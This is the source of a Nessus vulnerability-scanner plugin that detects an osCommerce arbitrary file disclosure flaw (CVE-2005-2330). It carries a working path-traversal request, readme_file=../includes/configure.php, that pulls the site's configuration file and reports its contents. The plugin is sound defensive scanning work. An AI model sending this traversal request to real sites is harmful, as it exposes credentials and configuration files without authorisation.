#
# (C) Tenable Network Security, Inc.
#
# additional directores added by SECNAP Network Security
# based on google search inurl:"extras/update.php" intext:mysql.php -display
# also, changing 'string' to return, since some sites can block ../


include("compat.inc");

if (description)
{
  script_id(19256);
  script_version("$Revision: 1.21 $");
 script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_cve_id("CVE-2005-2330");
  script_bugtraq_id(14294);
  script_osvdb_id(18249);

  script_name(english:"osCommerce update.php readme_file Parameter Arbitrary File Disclosure");
  script_summary(english:"Tries to read a file with osCommerce");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by an
information disclosure vulnerability." );
  script_set_attribute(attribute:"description", value:
"The osCommerce installation on the remote host has a supplementary
script, 'extras/update.php', that fails to validate user-supplied
input to the 'readme_file' parameter before using that to display a
file.  An attacker can exploit this flaw to read arbitrary files on
the remote host, such as the '.htaccess' file used to protect the
admin directory." );
  script_set_attribute(attribute:"see_also", value:"http://www.oscommerce.com/community/bugs,2835");
  script_set_attribute(attribute:"solution", value:"Remove the 'extras/update.php' script.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2005/07/18");
 script_set_attribute(attribute:"plugin_publication_date", value:"2005/07/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oscommerce:oscommerce");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");

  script_dependencies("oscommerce_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/oscommerce");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "The web server on port "+port+" does not support PHP scripts.");


# Test an install.
install = get_install_from_kb(appname:'oscommerce', port:port);
if (isnull(install)) exit(0, "osCommerce wasn't detected on port "+port+".");
dir = install['dir'];


# Try to exploit the flaw.
url = string(
  dir, "/extras/update.php?",
  # Grab osCommerce's configuration file.
  "readme_file=../includes/configure.php"
);

res = http_send_recv3(port:port, method:"GET", item:url);
if (isnull(res)) exit(1, "The web server on port "+port+" failed to respond.");

# There's a problem if it looks like osCommerce's configuration file.
if (egrep(string:res[2], pattern:"define\('(DIR_WS_HTTP_CATALOG|DIR_WS_IMAGES|DIR_WS_INCLUDES)"))
{
  contents = strstr(res[2], "<TD>");
  if (contents) contents = contents - "<TD>";
  if (contents) contents = contents - strstr(contents, "<HR NOSHADE");

  if (report_verbosity > 0 && !isnull(contents))
  {
    report = string(
      "\n",
      "Nessus was able to exploit the issue to retrieve the contents of\n",
      "'includes/configure.php' using the following URL :\n",
      "\n",
      "  ", build_url(port:port, qs:url), "\n"
    );
    if (report_verbosity > 1)
    {
      report += string(
        "\n",
        "Here are its contents :\n",
        "\n",
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
        contents,
        crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
      );
    }
    security_warning(port:port, extra:report);
  }
  else security_warning(port);

  exit(0);
}
# could not find config file, but still has update.php exposed
else if ("read_me=1" >< res[2])
{
  if (report_verbosity > 0)
  {
    report = string(
      "\n",
      "While Nessus did not seem to be able to read the contents of\n",
      "'includes/configure.php', it did determine that 'extras/update.php' is\n",
      "still exposed via the following URL :\n",
      "\n",
      "  ", build_url(port:port, qs:url), "\n"
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else exit(0, "The osCommerce install at "+build_url(port:port, qs:dir+"/")+" is not affected.");
